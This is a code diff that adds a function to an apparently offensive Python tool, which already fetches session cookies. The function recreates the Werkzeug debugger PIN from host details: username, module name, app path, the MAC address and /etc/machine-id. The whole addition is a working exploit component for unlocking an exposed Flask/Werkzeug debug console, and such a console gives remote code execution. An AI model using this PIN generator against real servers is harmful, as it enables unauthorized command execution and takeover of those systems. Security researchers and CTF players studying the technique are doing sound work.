@@ -7,7 +7,9 @@ import requests
 import ipaddress
 import netifaces
 from typing import TypedDict
-
+import hashlib
+from itertools import chain
+import tomllib
 
 class Proxy(TypedDict):
     http: str
@@ -91,3 +93,70 @@ def fetch_cookie(
         )
     vial.log.info(f"[bold green][+][/] Session cookie: [bold]{cookie}[/]")
     return cookie
+
+def generate_pin(config: str) -> bytes:
+    """
+    public_bits = [
+        username
+        modname
+        getattr(app, '__name__', getattr(app.__class__, '__name__'))
+        getattr(mod, '__file__', None),
+    ]
+    private_bits = [
+        str(uuid.getnode()),  /sys/class/net/ens33/address
+        get_machine_id(), /etc/machine-id
+    ]
+
+    LOGIC:
+    - Parse the configuration and retrieve private/public bytes.
+    - Generate and return PIN
+    """
+    with open(config, "rb") as fd:
+        data = tomllib.load(fd)["pin_gen"]
+        pinsalt = data["pinsalt"]
+        public_bits = {
+            "username": data["username"],
+            "modname": data["modname"],
+            "magic": data["magic"],
+            "abs_path": data["abs_path"],
+            "platform": data["platform"]
+        } 
+        private_bits = {
+            "mac": data["mac"],
+            "machine-id": data["machine-id"]
+        } 
+    # Check if bits are configured properly
+    for bit in chain(public_bits, private_bits):
+        if not bit in ("platform") and bit == "": # Will change to ("platform", "abs_path")
+            vial.log.error("Missing required bits.")
+
+    vial.log.info(f"Using config -> {config}:\n{data}")
+    salt = vial.DEFAULT_SALT.encode()
+    #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+    h = hashlib.sha1()
+    for bit in chain(public_bits.values(), private_bits.values()):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode()
+        h.update(bit)
+    h.update(salt)
+
+    cookie_name = '__wzd' + h.hexdigest()[:20]
+
+    num = None
+    if num is None:
+        h.update(pinsalt.encode())
+        num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+    rv = None
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
+                break
+         
+    else:
+        rv = num
+    vial.log.info(f"PIN: [bold]{rv}[/]")
+    return rv
